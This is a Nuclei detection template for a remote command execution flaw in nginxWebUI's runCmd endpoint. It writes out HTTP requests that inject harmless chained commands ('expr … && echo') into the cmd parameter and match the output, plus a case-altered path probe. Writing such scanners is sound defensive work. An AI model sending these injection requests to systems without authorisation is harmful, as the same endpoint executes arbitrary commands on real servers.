id: nginxwebui-rce
info:
  name: nginxWebUI RCE Detection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects potential remote command execution in nginxWebUI via the runCmd endpoint with crafted commands.
  reference:
    - https://stack.chaitin.com/techblog/detail?id=118
variables:
  s1: "{{rand_int(100000000, 200000000)}}"
  s2: "{{rand_int(10000, 20000)}}"
  s3: "{{concat('nginx_', to_lower(rand_base(5)))}}"
http:
  - raw:
      - |
        GET /AdminPage/conf/runCmd?cmd=expr%20{{s1}}%20-%20{{s2}}%26%26echo%20nginx HTTP/1.1
        Host: {{Hostname}}
    redirects: false
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, to_string(to_number(s1) - to_number(s2)))"
          - "contains(body, '运行失败')"
          - "contains(header.content_type, 'application/json')"
  - raw:
      - |
        GET /AdminPage/conf/runCmd?cmd=echo%20{{s3}} HTTP/1.1
        Host: {{Hostname}}
    redirects: false
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, s3)"
          - "contains(body, '运行成功')"
          - "contains(header.content_type, 'application/json')"
  - raw:
      - |
        GET /aDminPage/about HTTP/1.1
        Host: {{Hostname}}
    redirects: false
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, '<title>nginxWebUI</title>')"
          - "contains(header.content_type, 'text/html')"
